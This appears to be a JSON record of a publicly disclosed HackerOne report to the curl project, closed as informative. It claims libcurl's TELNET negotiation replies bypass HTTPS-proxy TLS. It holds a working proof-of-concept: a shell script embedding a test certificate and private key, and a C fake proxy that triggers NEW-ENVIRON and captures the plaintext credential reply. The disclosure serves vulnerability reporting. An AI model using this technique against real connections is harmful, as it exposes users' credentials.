@@ -1,0 +1,102 @@
+{
+  "id": 4021960,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDIxOTYw",
+  "url": "https://hackerone.com/reports/4021960",
+  "title": "TELNET control and environment data bypass HTTPS-proxy TLS",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2026-09-11T15:29:48.836Z",
+  "submitted_at": "2026-09-11T15:29:48.948Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-09-19T08:36:16.839Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-18T06:41:55.774Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI found a way to make libcurl send TELNET credential and environment data in cleartext to a TELNET origin, even when the connection is supposedly protected by an HTTPS proxy tunnel. The tunnel's TLS never sees it.\n\n## The bug\n\nFor `telnet://` routed through an HTTPS proxy, generic connection setup installs a TLS filter for the proxy hop and then an HTTP CONNECT tunnel filter, both before `telnet_do()` ever runs.\n\nOrdinary TELNET payloads go through `Curl_xfer_send()` and correctly traverse that filter chain. Negotiation and suboption replies don't: several paths call `swrite()` directly on the raw socket instead.\n\n```c\n// lib/telnet.c:1044-1047\nbytes_written = swrite(conn->sock[FIRSTSOCKET], temp, len);\nif(bytes_written < 0)\n  failf(data, \"Sending data failed (%d)\", SOCKERRNO);\n```\n\nThe same pattern shows up at `lib/telnet.c:235,706,713,996,1015`. `swrite()` writes straight to the operating-system socket, so every one of these control responses bypasses the live TLS filter entirely.\n\nA TELNET origin just has to send a negotiation or subnegotiation command through the tunnel. `telrcv()` dispatches it to `rec_*()` or `suboption()`, and the reply goes out as plaintext bytes on the wire.\n\nNEW-ENVIRON is the sharpest edge here: its response can carry the credential username curl adds automatically, plus any caller-configured environment values. TTYPE and XDISPLOC take the same unprotected path.\n\nSink: [`swrite()` call in the NEW-ENVIRON suboption handler, `lib/telnet.c:1047`](https://github.com/curl/curl/blob/e5e1c356107ea4f8208757deb69776d94496cfae/lib/telnet.c#L1047).\n\n## PoC\n\nA fake HTTPS proxy plays the malicious TELNET origin: it terminates TLS from curl, answers the CONNECT with `200 Connection established`, then sends a TELNET NEW-ENVIRON subnegotiation trigger *over that TLS session*. It simultaneously watches the raw socket underneath: if curl's reply comes back in cleartext instead of as a TLS record, that's the bug.\n\nTested against the audit revision `e5e1c356107ea4f8208757deb69776d94496cfae`.\n\n```\ncheckout: /src\nprivilege required: LOCAL — this was proved by running the built program, so there's no network principal or login involved\nrun:      sh /poc-scratch/reproduce.sh exploit\ncontrol:  sh /poc-scratch/reproduce.sh control\n```\n\n```sh\n#!/bin/sh\n# Reproduces: telnet:// over an HTTPS proxy leaks the USER credential in\n# PLAINTEXT because telnet.c's suboption() replies via swrite() on the raw\n# OS socket, bypassing the installed TLS-to-proxy filter.\n#\n# Overridable knobs (sensible defaults for the build image):\n#   VF_PORT   - loopback port the fake HTTPS proxy binds (default 38443)\n#   VF_MARKER - marker path the observable checks (default /tmp/vf-telnet-leak-marker)\n#   VF_WORK   - scratch dir for generated files (default /tmp/vf-telnet-work)\n#\n# Arm is $1: \"exploit\" (proxy sends NEW-ENVIRON trigger) or \"control\" (does not).\nset -e\nMODE=\"$1\"\nPORT=\"${VF_PORT:-38443}\"\nMARKER=\"${VF_MARKER:-/tmp/vf-telnet-leak-marker}\"\nWORK=\"${VF_WORK:-/tmp/vf-telnet-work}\"\nPROXY_READY=\"$WORK/proxy_ready\"\n\nmkdir -p \"$WORK\"\nrm -f \"$MARKER\" \"$PROXY_READY\"\n\n# ---- self-signed cert + key for the fake HTTPS proxy (curl uses --proxy-insecure) ----\ncat > \"$WORK/cert.pem\" <<'CERTEOF'\n-----BEGIN CERTIFICATE-----\nMIIDBzCCAe+gAwIBAgIUAQGuFO+FHbREZu8aq/G8F3onf8YwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHdmZwcm94eTAgFw0yNjA5MDgyMzQxNDZaGA8yMTI2MDgx\nNTIzNDE0NlowEjEQMA4GA1UEAwwHdmZwcm94eTCCASIwDQYJKoZIhvcNAQEBBQAD\nggEPADCCAQoCggEBALI8NGZtLjHz4hY1F0R9Ldf3x/2CzGyM3YezSO7Xrtu2RF/2\nYCYKv+yGtras2f6jrmkUzw228teCsKCKDh6Rnd05FzRPEQ5nWMOYAfuxU3Qap+E5\n+TKyve41ZLtaOvV7XM/GZXb1L3aDEpIXp7nLcOOhTv1n/nNGAXViO6MUhtxNj52Q\nZW8dbkDjM7E5Xaz7S9IsgZ1CgiwP/Axm+j8hzuu84Zd1Hq146/uj/oe4kbWFkW/I\noVA75HqeIFo+TrY726THuJFRIk86gy2powvjb2wKvw9W5Z7eYtjh9xai7hJ2TLcH\ncMSEGwZGoCZIf+8YhdeKS697mtTKAr45sj2lcGMCAwEAAaNTMFEwHQYDVR0OBBYE\nFORDNDHMG2BvZA4s808jj7rban3zMB8GA1UdIwQYMBaAFORDNDHMG2BvZA4s808j\nj7rban3zMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAJz7Sn/x\nFdSJIpQf/OqVwbpVZWp4dzLkUQJG5iTXJrVUDhzX5y7pgJxjgmUwPoNjdZttWeIf\n91afVrMvYwCiDtmaoknCiC+Eyy6YM+SPNm3i8+jix4oHlRr+1/fUZ6yPCdGcgU5q\nR65jaCxl6fxB7ZsWVRvy1AKFKwrYwHzDGDEprZ8JlfQYIgqvBHmE0wW3H6HwieBc\nylv3wflR06QS7YY7UkeupSac2C8+n/R7kIMJf64j11yPQi0cdhx7TBLTyN4zLEV4\nXFhHHGwq/UzvWCK92IGz0KIDfNF59HqpXwB7ZgC2hnQYtjrgUMdY+BZCIT5z7Vz7\nvc/XbDGAl+/WSUA=\n-----END CERTIFICATE-----\nCERTEOF\ncat > \"$WORK/key.pem\" <<'KEYEOF'\n-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCyPDRmbS4x8+IW\nNRdEfS3X98f9gsxsjN2Hs0ju167btkRf9mAmCr/shra2rNn+o65pFM8NtvLXgrCg\nig4ekZ3dORc0TxEOZ1jDmAH7sVN0GqfhOfkysr3uNWS7Wjr1e1zPxmV29S92gxKS\nF6e5y3DjoU79Z/5zRgF1YjujFIbcTY+dkGVvHW5A4zOxOV2s+0vSLIGdQoIsD/wM\nZvo/Ic7rvOGXdR6teOv7o/6HuJG1hZFvyKFQO+R6niBaPk62O9ukx7iRUSJPOoMt\nqaML429sCr8PVuWe3mLY4fcWou4Sdky3B3DEhBsGRqAmSH/vGIXXikuve5rUygK+\nObI9pXBjAgMBAAECggEAUQ0cvRlYQQIJZZTmDFCqiMQWb3vMD27tjLikaWyuiR51\nMHhfF92akmpea2rmRSxU81cxoyh3fTZisNam/hK1CbVdDn4IIRcxH90fxb/JVgqL\nHlpZLstmoI0qTiKFnj1notqzKGnuGAQZ7VKRhOV1ZCZmP8lLRktm/WTa/tmmTEa8\nME9+M45EiWIeGb3tWFsIfOVZ10pS6VBrvGZ4KpCUI7QVDkawC3LPX6nJD5pt1y2K\nAnMVkd5pPv/oXsUiRBe++QyBBanVkj54i8N1woksdAZFWI8JYP5FzAkyKGGJ+Gb5\ncGbfpzeCIeMO6h2HeFd31AIUs6DQz51n/WHni2wAWQKBgQDnFhgPx6SieAGV95JW\ncxR2eWoyIm9LVIiRfi199P6wx1IvDoYlUPz6H8DHk//dP0Ms7FFPSG46zV7LZ1F7\n4DmMvuK2hV661Psq5dbOvcH8AsHEuED2r5iUtEV9CnKKfYXjU00AtSy2YmHe6OuT\nmaj79Kuexpowe44n3oXeiSV7mwKBgQDFc2/X6A4fLIoxVcB6s6xE1vefHYmZ+xni\n3fQ/BZ9GL5TsTH0ak8HLgEQ4+u7LwKPi3dSzbWIZa0RljTiI1QnLMOxQJhQb4JZC\nU7zX4yCHCq/ixEboumwP5Vr7RNQ6upN/C7R+OU9myvnU8pwpQjL9yiqFtTztow7F\nI5JwUCKe2QKBgQDSzQzWGEDPFLodm+IaipA4IzoE0fTEuzB5yKinJj7P9IO7+XvV\nvrOHWD/7z76wjW0yJcFmmaQ0b/PxiSaD4l+dTORzq+ZmeLNGxrPVlLTIt5sbYRmh\n7z05KdnZ3xXtz+O7I9oysxM+rTCqr792vc2xSdjk1jcB0zQymoN0JZfT0QKBgCD7\nNkxnO6yjYPX6r+sPBhB9o+EVKv3ofptxnbHFO6SaoBKUeDUvRyi55StrZuXr6LQl\nf7j05XT/gO5Bl5brlvY01tRQd/1sF00+9YVOMAm+lECZroqDUTeahQcBqT2iGq8X\nAnAvHH88Gl0ipUkTALd5xH6PFn1PRlFRrs1J5W6JAoGAKlHMtBZT3YrGIKCW++y5\nHKPIKwR2+qqwRXm+JvxH84bYLa7KEKL2UQrlpjLVnmHkksxhLkmYXiv5yXynkPBF\naR+ppYVAKWLn1gEJjqS57DTPpwBMrtcmSUzeU2X40KfeL+SL2XFP7gozQsCXYSAK\n148NoUUnUafGs0r0a+CQQ1k=\n-----END PRIVATE KEY-----\nKEYEOF\n\n# ---- test peer: a loopback HTTPS proxy that plays the malicious telnet origin ----\ncat > \"$WORK/proxy.c\" <<'PROXYEOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <time.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <poll.h>\n#include <openssl/ssl.h>\n#include <openssl/err.h>\n\nint main(int argc, char **argv) {\n  if(argc < 7) { fprintf(stderr, \"usage\\n\"); return 2; }\n  const char *mode = argv[1];\n  int port = atoi(argv[2]);\n  const char *certf = argv[3], *keyf = argv[4], *markerf = argv[5], *readyf = argv[6];\n\n  SSL_library_init();\n  SSL_load_error_strings();\n  SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());\n  if(!ctx) { ERR_print_errors_fp(stderr); return 3; }\n  if(SSL_CTX_use_certificate_file(ctx, certf, SSL_FILETYPE_PEM) <= 0 ||\n     SSL_CTX_use_PrivateKey_file(ctx, keyf, SSL_FILETYPE_PEM) <= 0) {\n    ERR_print_errors_fp(stderr); return 3;\n  }\n\n  int ls = socket(AF_INET, SOCK_STREAM, 0);\n  int one = 1;\n  setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));\n  struct sockaddr_in sa; memset(&sa, 0, sizeof(sa));\n  sa.sin_family = AF_INET;\n  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n  sa.sin_port = htons((unsigned short)port);\n  if(bind(ls, (struct sockaddr*)&sa, sizeof(sa)) < 0) { perror(\"bind\"); return 4; }\n  if(listen(ls, 1) < 0) { perror(\"listen\"); return 4; }\n\n  int rf = open(readyf, O_CREAT|O_WRONLY|O_TRUNC, 0644);\n  if(rf >= 0) close(rf);\n\n  int cs = accept(ls, NULL, NULL);\n  if(cs < 0) { perror(\"accept\"); return 5; }\n\n  SSL *ssl = SSL_new(ctx);\n  SSL_set_fd(ssl, cs);\n  if(SSL_accept(ssl) <= 0) { ERR_print_errors_fp(stderr); return 6; }\n\n  char buf[4096];\n  int n = SSL_read(ssl, buf, sizeof(buf)-1);\n  if(n > 0) { buf[n]=0; fprintf(stderr, \"[proxy] CONNECT req: %.*s\\n\", n>60?60:n, buf); }\n\n  const char *resp = \"HTTP/1.1 200 Connection established\\r\\n\\r\\n\";\n  SSL_write(ssl, resp, (int)strlen(resp));\n\n  if(strcmp(mode, \"exploit\") == 0) {\n    /* Let curl finish CONNECT and enter the telnet poll loop, draining any\n     * TLS-buffered bytes, so the trigger is a fresh readable event. */\n    struct timespec ts; ts.tv_sec = 1; ts.tv_nsec = 0; nanosleep(&ts, NULL);\n    /* IAC SB NEW_ENVIRON IAC SE (255 250 39 255 240): server asks curl for\n     * its NEW-ENVIRON environment. curl's suboption() will reply with the\n     * USER credential via swrite() on the raw socket. */\n    unsigned char trig[5] = {255, 250, 39, 255, 240};\n    SSL_write(ssl, trig, sizeof(trig));\n    fprintf(stderr, \"[proxy] sent NEW_ENVIRON trigger over TLS\\n\");\n  } else {\n    fprintf(stderr, \"[proxy] control: no trigger sent\\n\");\n  }\n\n  /* Read RAW bytes off the socket (bypassing TLS). If curl honored the TLS\n   * filter, everything here would be ciphertext (TLS records start 0x17).\n   * The swrite() bypass instead puts the telnet suboption reply in the\n   * clear: look for IAC SB NEW_ENVIRON == FF FA 27. */\n  unsigned char raw[8192];\n  size_t total = 0;\n  struct pollfd pfd; pfd.fd = cs; pfd.events = POLLIN;\n  for(int i = 0; i < 60 && total < sizeof(raw); i++) {\n    int pr = poll(&pfd, 1, 200);\n    if(pr <= 0) continue;\n    ssize_t r = recv(cs, raw+total, sizeof(raw)-total, 0);\n    if(r <= 0) break;\n    total += (size_t)r;\n    for(size_t j = 0; total >= 3 && j + 2 < total; j++) {\n      if(raw[j]==255 && raw[j+1]==250 && raw[j+2]==39) {\n        fprintf(stderr, \"[proxy] PLAINTEXT NEW_ENVIRON suboption on wire: \");\n        for(size_t k=j; k<total; k++) {\n          unsigned char c = raw[k];\n          if(c>=32 && c<127) fputc(c, stderr); else fprintf(stderr,\"\\\\x%02x\", c);\n        }\n        fprintf(stderr, \"\\n\");\n        int mf = open(markerf, O_CREAT|O_WRONLY|O_TRUNC, 0644);\n        if(mf >= 0) { if(write(mf, raw+j, total-j)<0){} close(mf); }\n        SSL_free(ssl); close(cs); close(ls); SSL_CTX_free(ctx);\n        return 0;\n      }\n    }\n  }\n  fprintf(stderr, \"[proxy] no plaintext suboption framing observed (%zu raw bytes)\\n\", total);\n  SSL_free(ssl); close(cs); close(ls); SSL_CTX_free(ctx);\n  return 1;\n}\nPROXYEOF\n\n# Build the test peer (setup step; not the target under test).\ntimeout 60 cc $CFLAGS \"$WORK/proxy.c\" -o \"$WORK/proxy\" -lssl -lcrypto || exit 1\n\n# Start the fake HTTPS proxy and wait until it is listening.\n\"$WORK/proxy\" \"$MODE\" \"$PORT\" \"$WORK/cert.pem\" \"$WORK/key.pem\" \"$MARKER\" \"$PROXY_READY\" &\nPROXYPID=$!\ni=0\nwhile [ ! -f \"$PROXY_READY\" ] && [ $i -lt 100 ]; do i=$((i+1)); sleep 0.1; done\n\n# Everything is up and the shipped runtime is about to be exercised.\n: > \"${VF_READY:-/dev/null}\"\n\n# Drive the SHIPPED curl (bare name -> PATH-resolved /usr/local/bin/curl):\n# telnet:// through the HTTPS proxy, with an operator-supplied credential.\ntimeout 30 curl -sS --proxy-insecure -x \"https://127.0.0.1:$PORT\" \\\n    -u \"leakeduser42:secretpass\" \"telnet://target.invalid:23\" </dev/null || true\n\n# Give the peer a moment to finish capturing, then clean up.\nsleep 1\nkill \"$PROXYPID\" 2>/dev/null || true\nwait \"$PROXYPID\" 2>/dev/null || true\nexit 0\n```\n\nRunning the exploit arm, the proxy's raw-socket reader observed the NEW-ENVIRON suboption reply in plaintext (`IAC SB NEW_ENVIRON` framing, `FF FA 27`) immediately after sending the trigger over TLS: the credential `leakeduser42` travels straight past the tunnel's encryption.\n\nThe control arm, which never sends the NEW-ENVIRON trigger, produces no such observation on the raw socket.\n\n## Suggested direction\n\nReplace each direct TELNET `swrite()` with a filter-aware transport helper built on `Curl_xfer_send()` or `Curl_conn_send()`. It needs to handle partial writes, `CURLE_AGAIN`, and timeouts, and propagate failures back to `telnet_do()`. Keep IAC escaping separate from transport encryption so control bytes pass through the connection filters as ordinary protocol data.\n\nCheers,\nJosh\n\n## Impact\n\nAnyone using `telnet://` through an HTTPS proxy tunnel gets less confidentiality than the proxy setup implies. A malicious or on-path-observed TELNET origin can trigger NEW-ENVIRON/TTYPE/XDISPLOC negotiation and read curl's reply in cleartext, including the automatically-added USER credential and any caller-configured environment values. It can also corrupt the TLS stream in the process, failing the transfer after the leak has already happened.\n\nPreconditions:\n\n- A `telnet://` transfer routed through an HTTPS proxy (`--proxy`/`-x` with an `https://` proxy URL).\n- A TELNET origin (or an observer positioned to inject on that connection) willing to send a negotiation/subnegotiation command.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
